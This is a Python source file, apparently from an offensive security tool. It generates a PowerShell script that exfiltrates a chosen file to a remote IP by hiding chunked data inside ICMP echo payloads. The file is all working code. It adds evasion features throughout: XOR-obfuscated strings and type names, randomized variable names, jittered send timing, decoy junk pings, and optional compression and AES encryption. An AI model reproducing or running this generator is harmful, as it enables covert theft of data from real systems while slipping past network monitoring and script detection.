import random

from ..helpers import _ps_obfuscate
from ..obfuscation import xor_key, xor_encode


def _powershell_payload(file_path, ip, period, random_delay, randomize=False, junk=0, randomize_junk=False, compress=False, encrypt=None, passphrase='', estimate=False, obfuscate_strings=False):
    ps_file = file_path.replace("'", "''")

    template = '''$C=12;$IB=3;$R=5;$T=2000
$F='__FILE__';$IP='__IP__';$P=__PERIOD__;$RD=__RDELAY__
$d=[IO.File]::ReadAllBytes($F)
$n=[math]::Ceiling($d.Length/$C)
if($n -gt [math]::Pow(2,8*$IB)){throw 'File too large'}
if($RD -ne 0){Write-Host "[+] Sending '$F' ($($d.Length) bytes) to '$IP' in $n pings every ($P +- $RD) s"}
elseif($P -ne 0){Write-Host "[+] Sending '$F' ($($d.Length) bytes) to '$IP' in $n pings every $P s"}
else{Write-Host "[+] Sending '$F' ($($d.Length) bytes) to '$IP' in $n pings"}
if($RD -gt $P){Write-Warning "RandomDelay ($RD s) > Period ($P s)"}
$pg=New-Object Net.NetworkInformation.Ping
$o=New-Object Net.NetworkInformation.PingOptions(128,$true)
$sw=[Diagnostics.Stopwatch]::StartNew();$rnd=New-Object Random;$ls=$null
for($i=0;$i -lt $n;$i++){
$of=$i*$C;$l=[math]::Min($C,$d.Length-$of)
$pl=New-Object byte[] ($IB+$l)
$pl[0]=[byte](($i -shr 16) -band 0xFF)
$pl[1]=[byte](($i -shr 8) -band 0xFF)
$pl[2]=[byte]($i -band 0xFF)
[Array]::Copy($d,$of,$pl,$IB,$l)
$ok=$false
for($a=1;$a -le $R -and -not $ok;$a++){
if($null -ne $ls){$g=$P+($rnd.NextDouble()*2-1)*$RD;$w=$ls+[math]::Max(0,$g)-$sw.Elapsed.TotalSeconds;if($w -gt 0){Start-Sleep -Milliseconds([int]($w*1000))}}
$ls=$sw.Elapsed.TotalSeconds
try{$rp=$pg.Send($IP,$T,$pl,$o);$ok=$rp.Status -eq 'Success'}catch{$ok=$false}
}
if(-not $ok){throw "No reply for ping $i"}
$dn=$i+1
if($P -ne 0 -or $RD -ne 0){
$el=$sw.Elapsed.TotalSeconds;$by=[math]::Min($dn*$C,$d.Length)
$span=[TimeSpan]::FromSeconds([math]::Floor($el))
$tf='{0:00}:{1:00}:{2:00}' -f [math]::Floor($span.TotalHours),$span.Minutes,$span.Seconds
$st="`r  $dn/$n pings, $by/$($d.Length) bytes, $([math]::Round(100*$dn/$n))%, elapsed $tf"
if($RD -eq 0){$rm=$el/$dn*($n-$dn);$rs=[TimeSpan]::FromSeconds([math]::Floor($rm));$st+=", remaining ~$('{0:00}:{1:00}:{2:00}' -f [math]::Floor($rs.TotalHours),$rs.Minutes,$rs.Seconds)"}
Write-Host -NoNewline $st
}elseif($dn%100 -eq 0){Write-Host "  $dn/$n"}
}
Write-Host "`n`n$('='*50)`nDONE`n$('='*50)`n"
Write-Host "[*] SHA-256: $((Get-FileHash -Algorithm SHA256 -LiteralPath $F).Hash.ToLower())"
'''

    script = template
    _xor_key = None
    if obfuscate_strings:
        _xor_key = xor_key()
        key_str = ','.join(str(b) for b in _xor_key)
        decode_block = (
            f"$_k=@({key_str})\n"
            "$_d={param($h)$b=New-Object byte[] ($h.Length/2);for($z=0;$z -lt $b.Length;$z++){$b[$z]=[Convert]::ToByte($h.Substring($z*2,2),16)-bxor$_k[$z%$_k.Length]}[Text.Encoding]::UTF8.GetString($b)}\n"
        )
        script = script.replace(
            "$F='__FILE__';$IP='__IP__'",
            decode_block + "$F=(&$_d '__XFILE__');$IP=(&$_d '__XIP__')"
        )
    if compress:
        ob_sha = _ps_obfuscate('Security.Cryptography.SHA256')
        ob_ms = _ps_obfuscate('IO.MemoryStream')
        ob_cm = _ps_obfuscate('IO.Compression.CompressionMode')
        ob_gz = _ps_obfuscate('IO.Compression.GzipStream')
        script = script.replace(
            "$d=[IO.File]::ReadAllBytes($F)\n",
            "$d=[IO.File]::ReadAllBytes($F)\n"
            f"$sha=({ob_sha}-as[type])::Create()\n"
            "$hsh=[BitConverter]::ToString($sha.ComputeHash($d)).Replace('-','').ToLower()\n"
            "$osz=$d.Length\n"
            f"$ms=New-Object ({ob_ms})\n"
            f"$cm=({ob_cm}-as[type])\n"
            f"$gz=New-Object ({ob_gz}) ($ms,$cm::Compress)\n"
            "$gz.Write($d,0,$d.Length);$gz.Close()\n"
            "$d=$ms.ToArray();$ms.Close()\n"
            'Write-Host "[*] Compressed: $osz -> $($d.Length) bytes ($([math]::Round(100*$d.Length/$osz,1))%)"\n'
        )
        script = script.replace(
            'Write-Host "[*] SHA-256: $((Get-FileHash -Algorithm SHA256 -LiteralPath $F).Hash.ToLower())"',
            'Write-Host "[*] SHA-256: $hsh"'
        )
    if encrypt:
        key_size = int(encrypt.split('-')[1]) // 8
        ob_rng = _ps_obfuscate('Security.Cryptography.RandomNumberGenerator')
        ob_kdf = _ps_obfuscate('Security.Cryptography.Rfc2898DeriveBytes')
        ob_hn = _ps_obfuscate('Security.Cryptography.HashAlgorithmName')
        ob_aes = _ps_obfuscate('Security.Cryptography.Aes')
        ps_pass = passphrase.replace("'", "''")
        if obfuscate_strings:
            pp_assign = "$pp=(&$_d '__XPP__')\n"
        else:
            pp_assign = f"$pp='{ps_pass}'\n"
        script = script.replace(
            "$n=[math]::Ceiling($d.Length/$C)\n",
            pp_assign +
            "$salt=New-Object byte[] 8\n"
            f"$rng2=({ob_rng}-as[type])::Create();$rng2.GetBytes($salt)\n"
            f"$kdf=New-Object ({ob_kdf}) ($pp,$salt,10000,({ob_hn}-as[type])::SHA256)\n"
            f"$key=$kdf.GetBytes({key_size});$eiv=$kdf.GetBytes(16)\n"
            f"$aes=({ob_aes}-as[type])::Create()\n"
            "$aes.Key=$key;$aes.IV=$eiv\n"
            "$enc=$aes.CreateEncryptor()\n"
            "$ed=$enc.TransformFinalBlock($d,0,$d.Length)\n"
            "$hdr=[Text.Encoding]::ASCII.GetBytes('Salted__')\n"
            "$d=$hdr+$salt+$ed\n"
            "$aes.Dispose();$kdf.Dispose()\n"
            f'Write-Host "[*] Encrypted with {encrypt}"\n'
            "$n=[math]::Ceiling($d.Length/$C)\n"
        )
    if junk > 0:
        script = script.replace('$C=12;$IB=3;$R=5;$T=2000', f'$C=12;$IB=3;$R=5;$T=2000;$J={junk}')
        script = script.replace('if($n -gt [math]::Pow(2,8*$IB))', 'if($n -ge [math]::Pow(2,8*$IB))')
        if randomize_junk:
            jpl_init = '$jpl=New-Object byte[] ($IB+$C);$rnd.NextBytes($jpl);$jpl[0]=255\n'
        else:
            jpl_init = '$jpl=New-Object byte[] ($IB+$C);$rnd.NextBytes($jpl);$jpl[0]=255;$jpl[1]=255;$jpl[2]=255\n'
        junk_ps = ('for($ji=0;$ji -lt $J;$ji++){\n'
                   + jpl_init +
                   'if($null -ne $ls){$g=$P+($rnd.NextDouble()*2-1)*$RD;$w=$ls+[math]::Max(0,$g)-$sw.Elapsed.TotalSeconds;if($w -gt 0){Start-Sleep -Milliseconds([int]($w*1000))}}\n'
                   '$ls=$sw.Elapsed.TotalSeconds\n'
                   'try{[void]$pg.Send($IP,$T,$jpl,$o)}catch{}\n'
                   '}\n')
        script = script.replace('$dn=$i+1\nif(', '$dn=$i+1\n' + junk_ps + 'if(')
    if estimate:
        if compress:
            hash_line = 'Write-Host "[*] SHA-256: $hsh"\n'
        else:
            hash_line = 'Write-Host "[*] SHA-256: $((Get-FileHash -Algorithm SHA256 -LiteralPath $F).Hash.ToLower())"\n'
        est_ps = (
            'Write-Host "[!] ESTIMATE OPTION ENABLED — the file will NOT be transferred"\n'
            'Write-Host "[*] File size (after processing): $($d.Length) bytes"\n'
            'Write-Host "[*] Data pings: $n"\n'
        )
        if junk > 0:
            est_ps += (
                'Write-Host "[*] Junk pings: $($n*$J)"\n'
                'Write-Host "[*] Total pings: $($n*(1+$J))"\n'
            )
        else:
            est_ps += 'Write-Host "[*] Total pings: $n"\n'
        total_ps = '$n*(1+$J)' if junk > 0 else '$n'
        est_ps += (
            f'if($P -ne 0){{$dryet={total_ps}*$P;$dryes=[TimeSpan]::FromSeconds([math]::Floor($dryet));'
            "Write-Host \"[*] Estimated time: ~$('{0:00}:{1:00}:{2:00}' -f [math]::Floor($dryes.TotalHours),$dryes.Minutes,$dryes.Seconds)\"}\n"
            + hash_line +
            'exit\n'
        )
        script = script.replace("$pg=New-Object Net.NetworkInformation.Ping\n", est_ps)
    if randomize:
        import re
        var_names = [
            'C', 'IB', 'R', 'T', 'F', 'IP', 'P', 'RD',
            'd', 'n', 'pg', 'o', 'sw', 'rnd', 'ls',
            'i', 'of', 'l', 'pl', 'ok', 'a', 'g', 'w', 'rp',
            'dn', 'el', 'by', 'span', 'tf', 'st', 'rm', 'rs',
        ]
        if compress:
            var_names.extend(['sha', 'hsh', 'osz', 'ms', 'cm', 'gz'])
        if encrypt:
            var_names.extend(['pp', 'salt', 'rng2', 'kdf', 'key', 'eiv', 'aes', 'enc', 'ed', 'hdr'])
        if junk > 0:
            var_names.extend(['J', 'ji', 'jpl'])
        if obfuscate_strings:
            var_names.extend(['_k', '_d', 'z'])
        letters = 'abcdefghijklmnopqrstuvwxyz'
        alphanums = letters + '0123456789'
        ps_reserved = {'env', 'pid', 'pwd', 'ofs'}
        used = set()
        mapping = {}
        for name in var_names:
            while True:
                rand_name = random.choice(letters) + ''.join(random.choices(alphanums, k=2))
                if rand_name.lower() not in used and rand_name.lower() not in ps_reserved:
                    used.add(rand_name.lower())
                    mapping[name] = rand_name
                    break
        for old_name in sorted(var_names, key=len, reverse=True):
            script = re.sub(r'\$' + re.escape(old_name) + r'(?=\W|$)', '$' + mapping[old_name], script)

    if obfuscate_strings:
        script = (script
                  .replace('__XFILE__', xor_encode(file_path, _xor_key))
                  .replace('__XIP__', xor_encode(ip, _xor_key)))
        if encrypt:
            script = script.replace('__XPP__', xor_encode(passphrase, _xor_key))
        return (script
                .replace('__PERIOD__', str(period))
                .replace('__RDELAY__', str(random_delay)))

    return (script
            .replace('__FILE__', ps_file)
            .replace('__IP__', ip)
            .replace('__PERIOD__', str(period))
            .replace('__RDELAY__', str(random_delay)))
